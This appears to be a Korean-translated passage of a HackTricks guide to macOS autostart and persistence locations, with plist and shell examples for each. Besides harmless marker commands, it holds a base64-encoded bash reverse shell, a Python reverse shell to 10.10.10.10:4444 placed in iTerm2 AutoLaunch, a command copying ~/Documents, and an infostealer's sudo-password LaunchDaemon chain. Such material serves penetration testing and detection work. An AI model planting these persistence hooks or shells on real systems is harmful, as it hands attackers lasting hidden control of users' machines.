# macOS 자동 시작

{{#include ../banners/hacktricks-training.md}}

이 섹션은 블로그 시리즈 [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)를 크게 참고했으며, 목표는 가능한 경우 **더 많은 Autostart Locations**을 추가하고, 최신 macOS (13.4)에서 현재도 동작하는 **기술들**을 표시하며, 필요한 **권한**을 명시하는 것입니다.

## Sandbox Bypass

> [!TIP]
> 여기에는 파일에 기록하고 매우 흔한 동작을 기다리거나, 정해진 시간 경과 또는 샌드박스 내부에서 보통 수행할 수 있는 동작을 통해 간단히 무언가를 실행할 수 있게 해 주는 **sandbox bypass**에 유용한 시작 위치들이 정리되어 있습니다. 이 방법들은 보통 root permissions 없이 수행할 수 있습니다.

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> 흥미로운 사실로, **`launchd`**는 Mach-o 섹션 `__Text.__config`에 임베디드된 property list를 가지고 있으며, 여기에는 launchd가 시작해야 하는 잘 알려진 다른 서비스들이 포함되어 있습니다. 또한 이러한 서비스들은 `RequireSuccess`, `RequireRun` 및 `RebootOnSuccess` 같은 항목을 포함할 수 있는데, 이는 해당 서비스들이 반드시 실행되어 성공적으로 완료되어야 함을 의미합니다.
>
> 물론, code signing 때문에 수정할 수 없습니다.

#### 설명 및 악용

**`launchd`**는 부팅 시 OX S 커널에 의해 실행되는 가장 첫 번째 프로세스이자 종료 시 마지막으로 종료되는 프로세스입니다. 항상 **PID 1**을 갖습니다. 이 프로세스는 다음 위치들에 있는 ASEP plists에 명시된 설정을 읽고 실행합니다:

- `/Library/LaunchAgents`: 관리자에 의해 설치된 사용자별 agents
- `/Library/LaunchDaemons`: 관리자에 의해 설치된 시스템 전체 daemons
- `/System/Library/LaunchAgents`: Apple이 제공하는 사용자별 agents
- `/System/Library/LaunchDaemons`: Apple이 제공하는 시스템 전체 daemons

사용자가 로그인하면 `/Users/$USER/Library/LaunchAgents` 및 `/Users/$USER/Library/LaunchDemons`에 위치한 plists가 로그인한 사용자의 권한으로 시작됩니다.

**agents와 daemons의 주요 차이점은 agents는 사용자가 로그인할 때 로드되고 daemons는 시스템 부팅 시 로드된다는 점**입니다(예: ssh 같은 서비스는 어떤 사용자도 시스템에 접근하기 전에 실행되어야 합니다). 또한 agents는 GUI를 사용할 수 있는 반면 daemons는 백그라운드에서 실행되어야 합니다.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
사용자가 로그인하기 전에 **agent가 실행되어야 하는** 경우가 있으며, 이를 **PreLoginAgents**라고 합니다. 예를 들어, 로그인 시 보조 기술을 제공할 때 유용합니다. 또한 `/Library/LaunchAgents`에서도 찾을 수 있습니다(예제는 [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) 참조).

> [!TIP]
> New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however those plist files won't be automatically loaded after reboot).\
> It's also possible to **unload** with `launchctl unload <target.plist>` (the process pointed by it will be terminated),
>
> **Agent**나 **Daemon**이 **실행되지 못하도록**(예: override 같은) **아무런 요소가 없는지 확인하려면** 다음을 실행하세요: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

현재 사용자에 의해 로드된 모든 agents 및 daemons를 나열:
```bash
launchctl list
```
#### 예시 악성 LaunchDaemon 체인 (비밀번호 재사용)

A recent macOS infostealer reused a **captured sudo password** to drop a user agent and a root LaunchDaemon:

- agent 루프를 `~/.agent`에 작성하고 실행 가능하도록 만든다.
- 해당 agent를 가리키는 plist를 `/tmp/starter`에 생성한다.
- 도용한 비밀번호를 `sudo -S`와 함께 재사용하여 이를 `/Library/LaunchDaemons/com.finder.helper.plist`로 복사하고, 소유자를 `root:wheel`로 설정한 다음 `launchctl load`로 로드한다.
- 출력을 분리하기 위해 `nohup ~/.agent >/dev/null 2>&1 &`로 agent를 조용히 시작한다.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plist가 사용자가 소유한 경우, system wide 데몬 폴더에 있더라도, **작업은 사용자로 실행됩니다**(root가 아님). 이는 일부 권한 상승 공격을 방지할 수 있습니다.

#### More info about launchd

**`launchd`**는 **커널**에서 시작되는 **최초의** 유저 모드 프로세스입니다. 프로세스 시작은 **성공적**이어야 하고 **종료하거나 크래시할 수 없습니다**. 일부 **kill 신호**에 대해서도 **보호**되어 있습니다.

`launchd`가 수행하는 첫 번째 작업 중 하나는 다음과 같은 모든 **daemons**를 **시작**하는 것입니다:

- **Timer daemons** based on time to be executed:
- atd (`com.apple.atrun.plist`): `StartInterval`이 30분입니다
- crond (`com.apple.systemstats.daily.plist`): `StartCalendarInterval`이 00:15에 시작하도록 설정되어 있습니다
- **Network daemons** like:
- `org.cups.cups-lpd`: TCP에서 리스닝 (`SockType: stream`) 하며 `SockServiceName: printer`
- SockServiceName은 포트이거나 `/etc/services`의 서비스여야 합니다
- `com.apple.xscertd.plist`: 포트 1640의 TCP에서 리스닝합니다
- **Path daemons** that are executed when a specified path changes:
- `com.apple.postfix.master`: `/etc/postfix/aliases` 경로를 체크합니다
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` 항목에 `com.apple.xscertd.helper`라는 이름을 표시합니다
- **UserEventAgent:**
- 이전 항목과는 다릅니다. 특정 이벤트에 반응하여 `launchd`가 앱을 생성하게 만듭니다. 다만 이 경우 관련된 메인 바이너리는 `launchd`가 아니라 `/usr/libexec/UserEventAgent`입니다. 이 바이너리는 SIP로 제한된 폴더인 /System/Library/UserEventPlugins/에서 플러그인을 로드하며, 각 플러그인은 `XPCEventModuleInitializer` 키에 초기화기를 표시하거나, 이전 플러그인의 경우 `Info.plist`의 `CFPluginFactories` dict에서 `FB86416D-6164-2070-726F-70735C216EC0` 키 아래에 표시합니다.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- But you need to find an app with a TCC bypass that executes a shell that loads these files

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: `zsh`으로 터미널을 열 때
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: `zsh`으로 터미널을 열 때
- 루트 권한 필요
- **`~/.zlogout`**
- **Trigger**: `zsh` 터미널을 종료할 때
- **`/etc/zlogout`**
- **Trigger**: `zsh` 터미널을 종료할 때
- 루트 권한 필요
- 추가 정보: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: `bash`로 터미널을 열 때
- `/etc/profile` (동작하지 않음)
- `~/.profile` (동작하지 않음)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm으로 트리거될 것으로 예상되지만, xterm은 **설치되어 있지 않음**이며 설치 후에도 다음 오류가 발생함: xterm: `DISPLAY is not set`

#### Description & Exploitation

`zsh`나 `bash`와 같은 셸 환경을 시작하면 **특정 startup 파일들이 실행됩니다**. macOS는 현재 기본 셸로 `/bin/zsh`를 사용합니다. 이 셸은 Terminal 애플리케이션을 실행할 때나 SSH로 장치에 접속할 때 자동으로 사용됩니다. `bash`와 `sh`도 macOS에 존재하지만, 명시적으로 호출해야 사용됩니다.

`man zsh`(즉, **`man zsh`**)의 매뉴얼 페이지에는 startup 파일들에 대한 긴 설명이 있습니다.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 다시 열리는 애플리케이션

> [!CAUTION]
> 지정된 exploitation을 구성하고 로그아웃/로그인 또는 재부팅을 시도했지만 앱을 실행하는 데 성공하지 못했습니다. (앱이 실행되지 않았습니다 — 아마도 이러한 동작이 수행될 때 앱이 이미 실행 중이어야 할 수 있습니다)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- sandbox를 우회하는데 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **트리거**: 재시작 시 애플리케이션 재열림

#### 설명 및 Exploitation

다시 열릴 모든 애플리케이션은 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 안에 있습니다.

따라서 재열릴 애플리케이션이 당신의 앱을 실행하도록 만들려면, 단순히 **목록에 당신의 앱을 추가하면 됩니다**.

UUID는 해당 디렉토리를 나열하거나 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 명령으로 찾을 수 있습니다.

재열릴 애플리케이션을 확인하려면 다음을 실행할 수 있습니다:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
이 목록에 **애플리케이션을 추가하려면** 다음을 사용할 수 있습니다:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
- Terminal을 사용하면 사용자의 FDA 권한을 가질 수 있음

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminal 열기

#### 설명 & Exploitation

In **`~/Library/Preferences`**에는 애플리케이션의 사용자 환경설정이 저장되어 있다. 이 환경설정들 중 일부는 **다른 애플리케이션/스크립트 실행**을 구성할 수 있다.

For example, the Terminal can execute a command in the Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

This config is reflected in the file **`~/Library/Preferences/com.apple.Terminal.plist`** like this:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
따라서 시스템의 terminal 환경설정 plist를 덮어쓸 수 있다면, **`open`** 기능을 사용해 **terminal을 열고 그 명령이 실행되도록 할 수 있습니다**.

다음은 cli에서 추가하는 방법입니다:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal 스크립트 / 기타 파일 확장자

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal은 해당 사용자가 부여한 FDA 권한을 가지게 됩니다.

#### Location

- **Anywhere**
- **Trigger**: Terminal 열기

#### 설명 및 악용

If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.

Try it with:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).

### 오디오 플러그인

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [🟠](https://emojipedia.org/large-orange-circle)
- 추가적인 TCC 접근 권한을 얻을 수 있습니다

#### 위치

- **`/Library/Audio/Plug-Ins/HAL`**
- 루트 권한 필요
- **트리거**: coreaudiod 또는 컴퓨터 재시작
- **`/Library/Audio/Plug-ins/Components`**
- 루트 권한 필요
- **트리거**: coreaudiod 또는 컴퓨터 재시작
- **`~/Library/Audio/Plug-ins/Components`**
- **트리거**: coreaudiod 또는 컴퓨터 재시작
- **`/System/Library/Components`**
- 루트 권한 필요
- **트리거**: coreaudiod 또는 컴퓨터 재시작

#### 설명

앞의 writeups에 따르면 특정 오디오 플러그인을 **컴파일하여** 로드되게 할 수 있습니다.

### QuickLook 플러그인

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [🟠](https://emojipedia.org/large-orange-circle)
- 추가적인 TCC 접근 권한을 얻을 수 있습니다

#### 위치

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 설명 및 악용

QuickLook 플러그인은 파일의 **미리보기를 트리거할 때**(Finder에서 파일을 선택한 상태로 스페이스 바를 누름) 그리고 해당 파일 형식을 지원하는 **플러그인이 설치되어 있으면** 실행될 수 있습니다.

자체 QuickLook 플러그인을 컴파일하여 앞서 언급한 위치 중 하나에 배치하면 로드되고, 지원되는 파일로 가서 스페이스 바를 눌러 트리거할 수 있습니다.

### ~~로그인/로그아웃 Hooks~~

> [!CAUTION]
> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- 다음과 같은 명령을 실행할 수 있어야 합니다: `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

이들은 더 이상 권장되지 않지만, 사용자가 로그인할 때 명령을 실행하는 데 사용할 수 있습니다.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
이 설정은 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`에 저장됩니다
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
삭제하려면:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
The root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## 조건부 Sandbox Bypass

> [!TIP]
> 여기서는 **sandbox bypass**에 유용한 시작 위치들을 찾을 수 있습니다. 이는 무언가를 단순히 **파일에 써 넣어서** 실행하게 하거나, 특정 **프로그램이 설치되어 있음**, 또는 `"덜 흔한" 사용자` 동작이나 환경 같은 흔하지 않은 조건들을 **전제로 하는** 경우에 유용합니다.

### Cron

**작성**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 `crontab` 바이너리를 실행할 수 있어야 함
- 또는 root 권한 필요
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 직접 쓰기 접근에는 root 필요. `crontab <file>`을 실행할 수 있으면 root 불필요
- **Trigger**: cron job에 따라 다름

#### 설명 & Exploitation

다음 명령으로 **현재 사용자**의 cron job을 나열:
```bash
crontab -l
```
또한 모든 사용자들의 cron jobs는 **`/usr/lib/cron/tabs/`** 및 **`/var/at/tabs/`**에서 확인할 수 있습니다 (root 권한 필요).

MacOS에서는 스크립트를 **특정 주기**로 실행하는 여러 폴더를 다음 위치에서 찾을 수 있습니다:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
거기에서 정기적인 **cron** **jobs**, **at** **jobs** (그리 자주 사용되지는 않음) 및 **periodic** **jobs** (주로 임시 파일 정리에 사용됨)를 찾을 수 있습니다. 예를 들어 일일 periodic 작업은 다음과 같이 실행할 수 있습니다: `periodic daily`.

**user cronjob programatically**를 추가하려면 다음을 사용할 수 있습니다:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

분석: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- bypass sandbox에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2는 이전에 TCC 권한을 부여받은 적이 있음

#### 위치

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **트리거**: Open iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **트리거**: Open iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **트리거**: Open iTerm

#### 설명 및 악용

해당 경로의 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**에 저장된 스크립트는 실행됩니다. 예:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
또는:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
스크립트 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** 도 실행됩니다:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2.plist`** can **실행할 명령을 지정할 수 있습니다** when the iTerm2 terminal is opened.

This setting can be configured in the iTerm2 settings:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

And the command is reflected in the preferences:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
실행할 명령은 다음과 같이 설정할 수 있습니다:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> 임의 명령을 실행하기 위해 **iTerm2 preferences를 악용하는 다른 방법**이 있을 가능성이 높습니다.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 xbar가 설치되어 있어야 함
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility 권한을 요청함

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **트리거**: xbar가 실행될 때

#### 설명

인기 있는 프로그램 [**xbar**](https://github.com/matryer/xbar)가 설치되어 있으면, **`~/Library/Application\ Support/xbar/plugins/`**에 셸 스크립트를 작성할 수 있으며 xbar가 시작될 때 실행됩니다:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**작성**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- 샌드박스 우회에 유용함: [✅](https://emojipedia.org/check-mark-button)
- 하지만 Hammerspoon이 설치되어 있어야 함
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
- Accessibility 권한을 요청함

#### 위치

- **`~/.hammerspoon/init.lua`**
- **Trigger**: hammerspoon이 실행될 때

#### 설명

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)은 **macOS**용 자동화 플랫폼으로, 작업에 **LUA scripting language**를 활용합니다. 특히 완전한 AppleScript 코드 통합과 shell scripts 실행을 지원하여 스크립팅 기능을 크게 향상시킵니다.

앱은 단일 파일 `~/.hammerspoon/init.lua`를 찾고, 시작되면 해당 스크립트가 실행됩니다.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But BetterTouchTool must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- It requests Automation-Shortcuts and Accessibility permissions

#### 위치

- `~/Library/Application Support/BetterTouchTool/*`

이 도구는 특정 단축키가 눌렸을 때 실행할 애플리케이션이나 스크립트를 지정할 수 있게 해줍니다. 공격자는 데이터베이스에 자신의 **단축키와 실행 동작을 구성**하여 임의의 코드를 실행하도록 만들 수 있습니다(단축키는 단순히 키를 누르는 동작일 수도 있습니다).

### Alfred

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But Alfred must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- It requests Automation, Accessibility and even Full-Disk access permissions

#### 위치

- `???`

특정 조건이 충족될 때 코드를 실행할 수 있는 workflows를 생성할 수 있습니다. 잠재적으로 공격자가 workflow 파일을 만들어 Alfred가 이를 로드하도록 만들 수 있습니다(워크플로우를 사용하려면 premium 버전 결제가 필요합니다).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But ssh needs to be enabled and used
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH use to have FDA access

#### 위치

- **`~/.ssh/rc`**
- **Trigger**: ssh로 로그인
- **`/etc/ssh/sshrc`**
- 루트 권한 필요
- **Trigger**: ssh로 로그인

> [!CAUTION]
> To turn ssh on requres Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 설명 & Exploitation

기본적으로 `/etc/ssh/sshd_config`에 `PermitUserRC no`가 설정되어 있지 않다면, 사용자가 **SSH로 로그인할 때** 스크립트 **`/etc/ssh/sshrc`** 및 **`~/.ssh/rc`**가 실행됩니다.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But you need to execute `osascript` with args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치들

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** 로그인
- 익스플로잇 페이로드가 **`osascript`**를 호출하는 형태로 저장됨
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** 로그인
- 루트 권한 필요

#### 설명

System Preferences -> Users & Groups -> **Login Items**에서 사용자가 로그인할 때 실행되는 **항목들**을 찾을 수 있습니다.\
명령줄에서 이 항목들을 나열하고 추가 및 제거하는 것이 가능합니다:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
이 항목들은 파일 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**에 저장됩니다

**Login items**은 또한 API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc)를 사용하여 표시될 수 있으며, 그 구성은 **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**에 저장됩니다

### ZIP as Login Item

(Check previous section about Login Items, this is an extension)

**ZIP** 파일을 **Login Item**으로 저장하면 **`Archive Utility`**가 이를 열고, 예를 들어 ZIP이 **`~/Library`**에 저장되어 있고 폴더 **`LaunchAgents/file.plist`**에 backdoor가 포함되어 있다면 해당 폴더가 생성됩니다(기본적으로 생성되지는 않음) 그리고 plist가 추가되므로 사용자가 다음에 로그인할 때 **plist에 표시된 backdoor가 실행됩니다**.

또 다른 방법으로는 사용자 HOME 안에 **`.bash_profile`**와 **`.zshenv`** 파일을 생성하는 것입니다. 만약 LaunchAgents 폴더가 이미 존재한다면 이 기법은 여전히 작동합니다.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- sandbox 우회에 유용함: [✅](https://emojipedia.org/check-mark-button)
- 단, **`at`**을 **실행**해야 하며 **활성화**되어 있어야 합니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`**을 **실행**해야 하며 **활성화**되어 있어야 합니다

#### **Description**

`at` 작업은 특정 시간에 실행될 일회성 작업을 예약하도록 설계되어 있습니다. cron jobs와 달리 `at` 작업은 실행 후 자동으로 제거됩니다. 이러한 작업은 시스템 재부팅 후에도 지속된다는 점을 주의해야 하며, 특정 조건에서는 보안상 우려가 될 수 있습니다.

기본적으로 이들은 **비활성화**되어 있지만 **root** 사용자는 다음으로 **활성화**할 수 있습니다:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
이 작업은 1시간 후에 파일을 생성합니다:
